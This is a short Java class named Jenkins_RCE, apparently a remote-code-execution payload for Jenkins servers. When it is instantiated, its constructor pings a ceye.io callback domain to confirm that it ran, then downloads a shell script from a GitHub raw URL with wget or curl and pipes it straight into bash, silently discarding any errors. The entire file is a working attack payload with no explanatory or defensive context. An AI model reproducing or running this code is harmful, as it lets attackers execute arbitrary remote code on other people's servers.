public class Jenkins_RCE {
    public Jenkins_RCE() {
        try {
            java.lang.Runtime.getRuntime().exec("ping -c 1 jenkins.78kh7z.ceye.io");
            String[] cmd = new String[] {
                    "(wget -q -O - https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | bash )||( curl -fsSL https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | bash)" };
            for (String c : cmd) {
                java.lang.Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", c });
            }
        } catch (Exception e) {
        }

    }
}